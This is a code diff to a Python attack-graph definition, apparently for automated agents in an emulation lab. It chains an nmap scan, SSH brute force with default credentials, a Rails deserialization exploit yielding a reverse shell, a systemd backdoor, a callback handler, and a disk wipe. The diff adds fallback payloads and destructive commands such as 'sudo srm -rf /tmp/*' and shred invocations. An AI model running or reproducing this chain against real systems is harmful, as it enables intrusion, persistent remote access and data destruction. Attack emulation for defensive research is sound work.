@@ -43,6 +43,7 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
         technique_id="T1046",
         technique_name="Network Service Discovery",
         agent_type="recon",
+        goal="Map the target's attack surface",
         objective=f"Full port scan with OS detection and service versioning on {target_ip}.",
         target_ip=target_ip,
         tool_name="nmap",
@@ -52,20 +53,25 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
 
     graph.add_node(AttackNode(
         id="ssh_bruteforce",
-        label="SSH Brute Force (root)",
+        label="SSH Credential Guessing",
         tactic=Tactic.CREDENTIAL_ACCESS.value,
         technique_id="T1110.001",
         technique_name="Brute Force: Password Guessing",
         agent_type="exploit",
-        objective=f"Brute-force SSH login for root on {target_ip}:22.",
+        goal="Gain initial access to the target",
+        objective=f"Brute-force SSH login on {target_ip}:22 using username and password wordlists.",
         target_ip=target_ip,
         tool_name="metasploit",
         module="auxiliary/scanner/ssh/ssh_login",
         module_options={
-            "USERNAME": "root",
-            "PASS_FILE": "unix_passwords_modified.txt",
+            "USER_FILE": "/home/kali/unix_users.txt",
+            "PASS_FILE": "/home/kali/unix_passwords_modified.txt",
             "RHOSTS": target_ip,
             "RPORT": 22,
+        },
+        module_options_alternatives={
+            "USERNAME": ["vagrant", "msfadmin"],
+            "PASSWORD": ["vagrant", "msfadmin"],
         },
         tags=["ssh", "brute_force", "credential_access"],
     ))
@@ -77,6 +83,7 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
         technique_id="T1190",
         technique_name="Exploit Public-Facing Application",
         agent_type="exploit",
+        goal="Gain initial access to the target",
         objective=f"Exploit Rails secret deserialization on {target_ip}:8181 "
                   f"for reverse shell, then upgrade to meterpreter.",
         target_ip=target_ip,
@@ -87,6 +94,11 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
             "RPORT": 8181,
             "TARGETURI": "/",
             "SECRET": "a7aebc287bba0ee4e64f947415a94e5f",
+        },
+        module_options_alternatives={
+            "TARGETURI": ["/login", "/admin", "/sessions/new"],
+            "RPORT": [3000, 8080, 80],
+            "PAYLOAD": ["ruby/shell_bind_tcp", "cmd/unix/reverse_python"],
         },
         payload="ruby/shell_reverse_tcp",
         payload_options={
@@ -107,6 +119,7 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
         technique_id="T1543.002",
         technique_name="Create or Modify System Process: Systemd Service",
         agent_type="persistence",
+        goal="Maintain persistent access to the target",
         objective="Install a persistent service backdoor via meterpreter, "
                   "then kill all initial sessions.",
         target_ip=target_ip,
@@ -115,6 +128,10 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
         module_options={
             "SESSION": 2,
             "VERBOSE": True,
+        },
+        module_options_alternatives={
+            "SESSION": [1, 3],
+            "PAYLOAD": ["cmd/unix/reverse_perl", "cmd/unix/reverse_bash"],
         },
         payload="cmd/unix/reverse_python",
         payload_options={
@@ -131,6 +148,7 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
         technique_id="T1571",
         technique_name="Non-Standard Port",
         agent_type="exploit",
+        goal="Re-establish access through persistent backdoor",
         objective="Start multi/handler to catch the persistence service callback.",
         target_ip=target_ip,
         tool_name="metasploit",
@@ -149,14 +167,30 @@ def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:
         technique_id="T1561.001",
         technique_name="Disk Wipe: Disk Content Wipe",
         agent_type="impact",
-        objective="Install the 'wipe' utility and wipe /tmp to destroy data.",
+        goal="Destroy data on the target system",
+        objective="Install a wipe utility and destroy data on the target.",
         target_ip=target_ip,
-        tool_name="wipe",
+        tool_name="session",
         commands_to_run=[
-            "apt install wipe -y",
-            "wipe -f /tmp",
+            "{install_cmd}",
+            "{wipe_cmd}",
         ],
-        max_retries=1,
+        command_params={
+            "install_cmd": "sudo apt-get install -y wipe",
+            "wipe_cmd": "sudo wipe -f -q /tmp",
+        },
+        command_params_alternatives={
+            # If wipe isn't available, try alternatives
+            "install_cmd": [
+                "sudo apt-get install -y secure-delete",
+                "sudo apt-get install -y coreutils",  # for shred
+            ],
+            "wipe_cmd": [
+                "sudo srm -rf /tmp/*",          # secure-delete
+                "sudo find /tmp -type f -exec shred -vfz -n 1 {{}} \\;",  # shred
+            ],
+        },
+        max_retries=3,
         metadata={"wipe_target": "/tmp"},
         tags=["destructive", "disk_wipe", "impact"],
     ))
